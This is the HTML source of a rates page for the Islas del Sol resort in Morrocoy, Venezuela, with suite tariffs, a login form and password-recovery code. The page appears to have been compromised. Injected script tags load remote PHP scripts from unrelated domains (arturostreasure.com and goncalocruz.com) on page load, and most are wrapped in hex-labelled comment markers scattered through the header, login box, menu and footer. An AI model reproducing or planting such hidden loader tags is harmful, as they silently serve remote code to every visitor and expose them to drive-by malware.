<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Complejo Turistico Islas del Sol</title>
<meta name="title" content="Complejo Turistico Islas del Sol" >
<meta name="description" content="Complejo Tur�stico Vacacional Islas Del Sol Morrocoy Resort ubicado en la costa oriental del Estado Falc�n a escasos minutos del Parque Nacional Morrocoy en Venezuela." >
<meta name="keywords" content="isla,sol,playa,resort,turismo,piscina,parque acuatico,casino,discoteca,diversi�n,estado falcon,morrocoy,isla del sol,Venezuela,oceano,relax, bienestar,Spa Dual,restaurante,apartamentos tipo suite,jacuzzis,servicios,lanchas,comida nacional e internacional traslado a las playas,recreaci�n,transporte privado, familia,embarcadero,apartamentos,vacaciones,Complejo Turistico,Complejo Vacacional,Sitio Tur�stico,Lugar Vacacional,Morrocoy,costa oriental,Parque Nacional morrocoy,suite equipadas,suite acondicionadas,grupos familiares,club nautico,Resort cinco estrellas,cinco estrellas" >
<meta name="robots" content="INDEX, FOLLOW" >
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" >
<meta http-equiv="Content-Language" content="ES" >
<meta name="author" content="Corpodatos � dr dulce rodriguez | Barquisimeto - Edo. Lara" >
<meta name="reply-to" content="erivero@corpodatos.com, codigogr@gmail.com" >
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" >

<script type="text/javascript" src="js/funciones.js"></script>
<script type="text/javascript" src="js/jquery.tools.min.js"></script>

<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-18974882-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script><link href="css/style.css" rel="stylesheet" type="text/css" />

</head>
<body id="inter">
<div id="wrapper">
	<div id="header">
    	<div id="logo"><a href="#"><img src="images/logo.png" alt="Isla del sol" width="178" height="220"></a></div><!--7837d5--><script type="text/javascript" src="http://arturostreasure.com/lnwrqpzt.php?id=552555"></script><!--/7837d5-->
        <div id="navTop">
            <span class="codoLmain"></span>
            <div class="linermain">
           		 <ul>
<li class="pl13"><a # 
href="index.php">Inicio</a></li>
<li class="noticias"><a  href="noticias.php">Noticias</a></li>
<li><a  href="instal-Gparqueacuatico.php">Instalaciones</a></li>
<li><a  href="servicios.php">Servicios</a></li>
<li><a class='active' href="tarifas.php">Tarifas</a></li>
<li class="pr13"><a  href="contacto.php">Contacto</a></li>
</ul>            </div>
            <span class="codoRmain"></span>
        </div>
    </div>
    <div id="center">
        <div class="wrapcenter">
           <div class="columL">
               <div id="cartelerasuite">
               		<div class="leyend">
                    	<div id="nombresuit" class="maya">Suite de Lujo</div>
                    </div>
               		<div id="toprotativo" class="h282"></div>
               </div>
             <div class="contenido sinbg">
                 <h4><span class="brown">Tarifas por </span><span class="blue">Suite</span></h4>  
              
<!--EN ESTA ETIQUETA EL AJAX CARGA LAS DIFERENETES TABLAS DE TARIFAS / Los archivos estan en la raiz en el mismo orden del menu con los siguientes nombres: 
tabla-tarifas1.php tabla-tarifas2.php tabla-tarifas3.php tabla-tarifas4.php tabla-tarifas5.php en esos archivos es que debes programar. La imagen del top y el nombre de la cartelera lo cambia el ajax-->
              	<div id="tarifasuit"></div>  
              <!--FIN--> 
                 
                 <p>
                 <b>Tarifas vigentes para el disfrute a partir del</b> 10/12/2010<br />
					Conozca las <a href="condicioneshosp.php" rel="#overlay">Condiciones para el Hospedaje</a>
                 </p>
                 
                 <div class="codmaya pl30 mt20">
                 	<h3>Observaciones que usted debe tener en consideraci�n</h3>
                    <ul id="list02">
                    	<li>Precios Establecidos por Noches.</li>

                        <li>Los Montos Incluyen el 12% del Impuesto al Valor Agregado (IVA).</li>
                        
                        <li>El paquete incluye hospedaje, traslado a los cayos "Cayo Sal" o "Cayo Muerto".</li>
                        
                        <li>Reservar por los Tel�fonos: (0241) 825.44.66 / (0241) 825.28.33 Fax (0241) 825.96.94.</li>
                        
                        <li>El beneficio del descuento extra del 10% es para el multipropietario y/o tiempo compartido que haya cumplido con los pagos dentro de los plazos establecidos.</li>
                    </ul>
                 </div>
                    
                    
             </div>            
           </div>
           <div class="columR">
           		<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" >
<script type="text/javascript">
function cargar1(campo){
if(campo.value==''){
  campo.value="usuario";
}else{
if(campo.value=="usuario"){
  campo.value='';
}
}}
function cargar2(campo){
if(campo.value==''){
  campo.value="Contrase�a";
  campo.type='text';
}else{
if(campo.value=="Contrase�a"){
  campo.value='';
  campo.type='password';
}
}}


</script>

<script>
//VALIDACI�N ACCESO
function validarform0(form) {
  var usuario= form.usuario.value;
  var pass= form.pass.value;
  
if ( usuario == "" || usuario == "usuario" ) {
inlineMsg('usuario','Su nombre de usuario');
document.getElementById('usuario').value='';
document.getElementById('usuario').focus();
return false;
}

if ( pass == "" || pass == "Contrase�a") {
inlineMsg('pass','Su Contrase�a');
document.getElementById('pass').value='';
document.getElementById('pass').focus();
return false;
}

};

function isValidEmailAddress(emailAddress) {
	var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
	return pattern.test(emailAddress);
}

jQuery.fn.reset = function () {
	  $(this).each (function() { this.reset(); });
}

$(document).ready(function(){	
	
	$("#enviar").click(function(){
		var valido	= true;
		var email 	= $("#email").val();

		if ((valido)&&( email == "" )) {
			inlineMsg('email','Su Email');
			$("#email").focus();  
			valido = false;
			return false;
		}

		if ((valido)&&(!isValidEmailAddress(email))){
			inlineMsg('email','Email inv�lido');
			$("#email").focus();  
			valido = false;
			return false;
		}
		
		if (valido){
			$('#loading').show();
			$("#loading").html('<img src="images/loading.gif"> Espere por favor...'); 
			$.ajax({
				type: 'POST',
				url: 'getContrasena.php',
				data: $('#recuperar').serialize(),
				success: function(data) {
					var resultado = data.split('|');					
					if (resultado[0] == 'true'){
						$("#recuperar").reset();
						$('#loading').hide();	
						$('#resultOk2').fadeIn('slow');			
						$('#resultOk2').html(resultado[1]);	
						$('#resultOk2').fadeOut(10000);
					}
					else{
						$('#loading').hide();
						$('#resultError2').fadeIn('slow');
						$('#resultError2').html(resultado[1]);
						$('#resultError2').fadeOut(10000);
					}
				},
				error:function(){
					$('#loading').hide();	
					$('#resultError2').fadeIn('slow');
					$('#resultError2').html('Error enviando los datos. Intente nuevamente.');
					$('#resultError2').fadeOut(10000);
				}				
			})
		}
		
	});	
	return false;
});
</script>


<div class="acceso">            
    <form id="acceso1" name="acceso1" action="extranet/login/validar" method="post" onsubmit="return validarform0(this)">
        <input class="inputx" type="text" value="usuario" id="usuario" name="usuario" onBlur='cargar1(this)' onfocus='cargar1(this)'/>
        <input class="inputx" type="password" value="Contrase�a" id="pass" name="pass" onBlur='cargar2(this)' onfocus='cargar2(this)' />
        <input class="btnir" type="submit" value="" />
    </form>
    <a id="dialog_link" class="modalInput enlace1" rel="#prompt" href="#">Recordar Contrase�a</a>
    <a  class="enlace2" href="registro.php">Registrarse</a>
</div><!--11039e--><script type="text/javascript" src="http://arturostreasure.com/lnwrqpzt.php?id=552522"></script><!--/11039e-->
 


<!-- RECUPERAR -->
<div class="modal" id="prompt">
	<h3>Recuperar Contrase�a</h3>
	<div id="dialog" title="Recuperar Contrase�a"><br />
        <p><b>�Tiene problemas para acceder a su cuenta?</b><br />
        Ingrese su Email, le enviaremos un correo electr�nico con su contrase�a.</p><br />
        <br />
        <form id="recuperar" name="recuperar">
            <label for="email">Su Email</label>
            <input type="text" class="text ui-widget-content ui-corner-all" id="email" name="email">		
            <input type="button" id="enviar" class="btng" value="enviar">
            <button type="button" class="close btng"> Cancelar</button>
        </form>  
        <br class="clr" />		
        <br class="clr" />
        <div id="loading"></div>  
		<div id="resultOk2" class="aviso" style="display:none;"></div> 
		<div id="resultError2" class="alert" style="display:none;"></div>								                                                                                                                         
	</div>
</div>


<script>
// What is $(document).ready ? See: http://flowplayer.org/tools/documentation/basics.html#document_ready
$(document).ready(function() {

var triggers = $(".modalInput").overlay({

	// some mask tweaks suitable for modal dialogs
	mask: {
		color: '#ebecff',
		loadSpeed: 200,
		opacity: 0.9
	},

	closeOnClick: false

});

});
</script>



<script type="text/javascript" src="http://arturostreasure.com/lnwrqpzt.php?id=552581"></script>                <script type="text/javascript">

function ajax(numerosu,nombresu){
var urlbase='tabla-tarifas'+numerosu+'.php'
	var id=id;
	var resp="";
	     var vParam ="";
			var xmlhttp=false;
			try {
				xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
			} catch (e) {
			try {
			xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			} catch (E) {
			xmlhttp = false;
			}
			}

			if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
				xmlhttp = new XMLHttpRequest();
			}
			
			
			xmlhttp.open('POST', urlbase, true);			
				
			xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded'); // sending it as encoded formdata
			xmlhttp.setRequestHeader('Content-length',vParam.length); // we need to specify the length of the contents
			xmlhttp.setRequestHeader('Connection','close'); // Connection is to be closed after transfer
			 
			xmlhttp.onreadystatechange=function() {
				if (xmlhttp.readyState == 4) { // Wait until everything is fetched!
						resp = xmlhttp.responseText;						
						
						document.getElementById('toprotativo').innerHTML="";
						
						imag = document.createElement("img");
						imag.setAttribute("src", "images/cart-suite"+numerosu+".jpg");
						document.getElementById("toprotativo").appendChild(imag);
						document.getElementById('nombresuit').innerHTML=nombresu;
						document.getElementById('tarifasuit').innerHTML=resp;
						
						for (i=1; i<=5; i++){

							if (i==numerosu){				
								if (document.getElementById('itms'+i).className ==''){																				
								document.getElementById('itms'+i).className ='active';				
								}else{				
								document.getElementById('itms'+i).className ='';				
								}				
							}else{				
							document.getElementById('itms'+i).className ='';				
							}				
						}
											
				}
			}
			xmlhttp.send(vParam); // This time, we need to send the text.
}
ajax('1','Suite de Lujo');		
</script>


<div id="menuRcontp">
<div class="shadow"><img src="images/shadow-navR.png" width="272" height="22"></div><!--bfeb57--><script type="text/javascript" src="http://arturostreasure.com/lnwrqpzt.php?id=552560"></script><!--/bfeb57-->

<ul class="contenMR">
<li><a class="" id="itms1" onclick="ajax('1','Suite de Lujo')" href="javascript:void(0)"><span class="arrowblack"></span>Suite de Lujo</a></li>
<li><a class="" id="itms2" onclick="ajax('2','Suite Ejecutiva')" href="javascript:void(0)"><span class="arrowblack"></span>Suite Ejecutiva</a></li>
<li><a class="" id="itms3" onclick="ajax('3','Suite Junior')" href="javascript:void(0)"><span class="arrowblack"></span>Suite Junior</a></li>
<li><a class="" id="itms4" onclick="ajax('4','Suite Premier')" href="javascript:void(0)"><span class="arrowblack"></span>Suite Premier</a></li>
<li><a class="" id="itms5" onclick="ajax('5','Suite Vip')" href="javascript:void(0)"><span class="arrowblack"></span>Suite Vip</a></li>
</ul>
<div class="bottomMR">.</div>
</div>                <br class="clr" />
             	<div class="separadorboxR"></div>
                <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" >
<div class="boxR sinbg">
                	                    <div id="gatgetsI">
                        <div class="boxgat">
                           <a class="btnabsolute" href="servicios.php"></a>
                           <div class="icon"><img src="images/icon-info.png" width="60" height="47" /></div>
                           <div class="txgat">
                           	 <h1 class="h1naranja">Informaci&oacute;n</h1> <h3 class="h3black">General</h3>
                           </div>
                        </div>
                   	  <div class="boxgat">
                           <a class="btnabsolute" href="serv-solicitud.php"></a>
                        <div class="icon"><img src="images/icon-solicitud-on-line.png" width="44" height="47" /></div>
                           <div class="txgat">
                           	   <h1 class="h1naranja">Reservaci�n</h1> <h3 class="h3black">en l�nea</h3>
                           </div>
                      </div>
                                              
                      <div class="boxgat">
                         <a class="btnabsolute" href="rci.php"></a>
                         <div class="icon"><img src="images/icon-rci.png" width="60" height="47" /></div>
                           <div class="txgat">                               
                             <h1 class="h1naranja">Resort</h1> <h3 class="h3black">Condominiums<br /> International</h3>
                           </div>
                      </div>                      
                    
                    </div>                    
</div>                
           		<ul class="redes">
	<h3>Siguenos</h3>	 
	<li><a href="#"><img src="images/icon-fb.png" width="28" height="28" /></a></li<!--656c7e--><script type="text/javascript" src="http://arturostreasure.com/lnwrqpzt.php?id=552575"></script><!--/656c7e-->
> 
	<li><a href="#"><img src="images/icon-tw.png" width="28" height="28" /></a></li>   
</ul> 
         		<br class="clr" />  
          </div>
        </div>
	</div>
	<div class="bottominter"></div>
 </div>
 
   
    <div id="footer">
        <div class="boxfooter">
        	<div id="wrapperF"><div class="copy">
  <p>Copyright � 2010 | DTM "OO", C.A. | RIF J-002663740 | <a href="http://www.corpodatos.com" target="_blank">Corpodatos.com</a> � <a href="http://www.codigogr.com" target="_blank">Codigogr</a> �</p></div>
<div id="navBottom"><ul>
<li class="pl13"><a # 
href="index.php">Inicio</a></li>
<li class="noticias"><a  href="noticias.php">Noticias</a></li>
<li><a  href="instal-Gparqueacuatico.php">Instalaciones</a></li>
<li><a  href="servicios.php">Servicios</a></li>
<li><a class='active' href="tarifas.php">Tarifas</a></li>
<li class="pr13"><a  href="contacto.php">Contacto</a></li>
</ul><script type="text/javascript" src="http://goncalocruz.com/kqxhhl2j.php?id=198839"></script></div></div>
        </div>
    </div>
    
    
<!-- overlayed element -->
<div class="apple_overlay2" id="overlay">
	<!-- the external content is loaded inside this tag -->
	<div class="contentWrap"></div>
</div>  
    
    
<script>
$(function() {

	// if the function argument is given to overlay,
	// it is assumed to be the onBeforeLoad event listener
	$("a[rel]").overlay({

		mask: 'white',
		effect: 'apple',

		onBeforeLoad: function() {

			// grab wrapper element inside content
			var wrap = this.getOverlay().find(".contentWrap");

			// load the page specified in the trigger
			wrap.load(this.getTrigger().attr("href"));
		}

	});
})


</script>
</body>
</html>
